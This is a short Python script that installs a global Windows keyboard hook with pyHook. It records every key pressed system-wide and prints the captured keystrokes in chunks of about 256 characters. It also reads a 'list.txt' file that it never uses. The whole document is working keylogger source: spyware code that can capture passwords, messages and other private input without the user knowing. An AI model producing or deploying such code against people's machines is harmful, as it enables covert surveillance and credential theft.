from win32api import *
import win32con
import pyHook
import msvcrt as m
import time
import pythoncom

lista = open('list.txt', 'r').read().split()
global keylog
keylog = ''

def callback(event):
    global keylog
    if event.Key == 'Space':
        keylog += ' '
    elif event.Key == 'Return':
        keylog += '\n'
    else:
        keylog += event.Key
    if len(keylog) > 256:
        print(keylog)
        keylog = ''
    return True

if __name__=='__main__':
    hook = pyHook.HookManager()
    hook.KeyDown = callback
    hook.HookKeyboard()
    pythoncom.PumpMessages()
